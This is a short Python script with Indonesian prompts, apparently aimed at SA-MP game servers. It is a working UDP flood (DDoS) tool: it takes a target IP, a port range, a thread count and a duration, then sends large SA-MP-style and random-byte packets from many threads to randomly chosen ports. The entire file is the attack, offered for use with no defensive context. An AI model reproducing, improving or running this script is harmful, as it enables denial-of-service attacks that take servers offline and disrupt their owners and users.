import socket
import threading
import time
import random
import struct

ip = input("Target IP: ")
port_range_start = int(input("Port range mulai (contoh: 6827): "))
port_range_end = int(input("Port range akhir (contoh: 8888): "))
threads = int(input("Jumlah Threads (500-1000+): "))
duration = int(input("Durasi serangan (detik): "))

target_ports = [random.randint(port_range_start, port_range_end) for _ in range(100)]  # 100 port acak
timeout = time.time() + duration

def generate_samp_packet(ip, port):
    ip_parts = list(map(int, ip.split('.')))
    samp_header = b"SAMP" + bytes(ip_parts) + struct.pack(">H", port)
    packet_id = random.randint(0x00, 0xFF)
    payload_size = random.randint(1024, 65507)
    return samp_header + bytes([packet_id]) + random._urandom(payload_size - len(samp_header) - 1)

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            for p in target_ports:
                if random.random() < 0.7:
                    payload = generate_samp_packet(ip, p)
                else:
                    payload = random._urandom(random.randint(1024, 65507))
                sock.sendto(payload, (ip, p))
        except:
            pass

print(f"\n[+] Mulai DDoS ke {ip} dengan port acak dalam rentang {port_range_start}-{port_range_end} selama {duration} detik dengan {threads} threads...\n")
thread_list = []
for _ in range(threads):
    t = threading.Thread(target=flood)
    t.start()
    thread_list.append(t)

for t in thread_list:
    t.join()

print("\n[✓] DDoS selesai, cek server.")
